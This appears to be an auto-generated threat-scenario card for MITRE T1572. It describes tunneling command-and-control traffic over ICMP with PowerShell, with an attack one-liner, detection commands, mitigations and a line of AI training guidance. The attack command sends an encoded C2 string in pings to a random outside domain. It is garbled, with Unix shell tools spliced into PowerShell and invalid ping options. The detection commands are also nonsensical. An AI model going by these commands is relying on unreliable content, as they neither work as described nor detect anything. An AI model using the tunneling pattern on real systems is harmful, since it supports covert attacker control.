---
type: campaign
scenario_id: 358
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell to tunnel C2 commands via ICMP.

## Threat Description
Using PowerShell to tunnel C2 commands via ICMP.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; ping -n 10 -l 1000 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -p $(echo c2cmd | base64 -w0)"
```

## Detection Logic
Monitor ICMP ping: `wmic process where name='ping.exe' get commandline | findstr -p`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.

## AI Training Prompt
Train AI to detect ICMP-based C2 tunneling via ping by analyzing packet size, base64-encoded patterns, and ICMP traffic anomalies; recommend ICMP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
